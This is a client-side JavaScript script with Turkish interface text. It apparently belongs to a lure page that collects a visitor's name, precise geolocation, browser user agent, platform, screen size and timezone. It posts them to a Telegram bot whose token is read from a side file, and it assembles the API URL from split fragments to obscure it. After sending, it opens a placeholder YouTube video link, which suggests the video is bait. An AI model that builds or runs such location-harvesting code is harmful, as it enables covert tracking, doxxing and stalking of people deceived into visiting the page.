(async () => {
  const $ = id => document.getElementById(id);
  const form = $('form');
  const status = $('status');
  const geoWarn = $('geoWarn');

  form.addEventListener('submit', async e => {
    e.preventDefault();

    const name = $('name').value.trim();
    const note = $('note').value.trim();
    const consent = $('consent').checked;

    if (!name || !consent) {
      status.textContent = "Lütfen adınızı girin ve açık onay verin.";
      return;
    }

    status.textContent = "Konum izni isteniyor...";

    let position;
    try {
      position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
      });
    } catch (err) {
      geoWarn.style.display = "block";
      status.textContent = "Konum alınamadı.";
      return;
    }

    const lat = position.coords.latitude.toFixed(6);
    const lon = position.coords.longitude.toFixed(6);
    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenSize = `${screen.width}x${screen.height}`;
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

    status.textContent = "bilgiler.txt dosyası okunuyor...";

    let raw;
    try {
      raw = await fetch("bilgiler.txt?v=" + Date.now()).then(r => r.text());
    } catch {
      status.textContent = "bilgiler.txt okunamadı.";
      return;
    }

    const token = raw.match(/BOT_TOKEN=(.*)/)?.[1]?.trim();
    const chatId = raw.match(/CHAT_ID=(.*)/)?.[1]?.trim();

    if (!token || !chatId) {
      status.textContent = "bilgiler.txt içinde gerekli veriler bulunamadı.";
      return;
    }

    const message = [
      `🧾 Yeni Giriş`,
      `👤 İsim: ${name}`,
      `📝 Not: ${note || "-"}`,
      `🕒 Zaman: ${timestamp}`,
      `📍 Konum: ${lat}, ${lon}`,
      `🔗 Harita: ${mapLink}`,
      `🖥️ Tarayıcı: ${userAgent}`,
      `💻 Platform: ${platform}`,
      `📺 Ekran: ${screenSize}`,
      `⏰ Zaman Dilimi: ${tz}`,
      `🔒 Onay: Evet`
    ].join("\n");

    status.textContent = "üyelik verileri gönderiliyor...";

    const url = ["https:/", "/api.", "telegram", ".org/bot", token, "/sendMessage"].join("");
    const body = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body
      });
      const json = await response.json();
      if (json.ok) {
        status.textContent = "✅ Gönderildi. Video açılıyor...";
        setTimeout(() => {
          window.open("https://www.youtube.com/watch?v=videourlyaz", "_blank");
        }, 1500);
      } else {
        status.textContent = "❌ sunucu bağlantı başarısız.";
      }
    } catch {
      status.textContent = "❌ Ağ hatası.";
    }
  });
})();
